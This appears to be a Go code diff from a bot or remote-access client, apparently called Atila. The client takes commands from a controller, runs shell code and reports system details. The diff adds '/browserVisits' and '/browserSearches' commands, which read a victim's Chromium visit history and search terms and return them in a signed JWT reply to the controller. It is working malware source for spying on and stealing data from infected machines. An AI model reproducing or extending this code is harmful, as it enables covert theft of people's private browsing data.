@@ -39,10 +39,12 @@ type ReplyMessage struct {
 // Corresponds to ReplyMessage.Content, keep in mind that this type needs to be
 // converted into string by making it into a JWT, prior to assigning it to ReplyMessage.Content
 type ReplyContent struct {
-	ShellOutput      string    `json:"shellOutput"`      // Output of executed shell code.
-	OsDetails        OsDetails `json:"osDetails"`        // Basic information about the system.
-	Other            string    `json:"other"`            // Any string of data.
-	WebSearchResults []string  `json:"webSearchResults"` // A slice of strings made out of web search results. (url links)
+	ShellOutput        string    `json:"shellOutput"`        // Output of executed shell code.
+	OsDetails          OsDetails `json:"osDetails"`          // Basic information about the system.
+	Other              string    `json:"other"`              // Any string of data.
+	WebSearchResults   []string  `json:"webSearchResults"`   // A slice of strings made out of web search results. (url links)
+	WebHistoryVisits   []string  `json:"webHistoryVisits"`   // A slice of strings made out of web url visit history from a browser.
+	WebHistorySearches []string  `json:"webHistorySearches"` // A slice of strings representing search terms from a browser.
 }
 
 // IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
@@ -255,6 +257,26 @@ func interpretMessage(host string, message Message) (Message, error) {
 		})
 		replyContent.Other = "Added peer:" + peerAddress
 
+		// Grab Chromium history of visits.
+	} else if content.Shell == "/browserVisits" {
+		visits, err := grabChromiumHistory("VISITS")
+		if err != nil {
+			fmt.Println(err.Error())
+			return reply, err
+		}
+
+		replyContent.WebHistoryVisits = visits
+
+		// Grab Chromium history of search terms.
+	} else if content.Shell == "/browserSearches" {
+		searches, err := grabChromiumHistory("TERMS")
+		if err != nil {
+			fmt.Println(err.Error())
+			return reply, err
+		}
+
+		replyContent.WebHistorySearches = searches
+
 		// Perform web search using duckduckgo.
 	} else if strings.HasPrefix(content.Shell, "/duckit ") {
 		term := content.Shell[8:]
@@ -276,10 +298,12 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 	// Sign the reply with the private key.
 	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
-		"shellOutput":      replyContent.ShellOutput,
-		"osDetails":        replyContent.OsDetails,
-		"other":            replyContent.Other,
-		"webSearchResults": replyContent.WebSearchResults,
+		"shellOutput":        replyContent.ShellOutput,
+		"osDetails":          replyContent.OsDetails,
+		"other":              replyContent.Other,
+		"webSearchResults":   replyContent.WebSearchResults,
+		"webHistoryVisits":   replyContent.WebHistoryVisits,
+		"webHistorySearches": replyContent.WebHistorySearches,
 	})
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
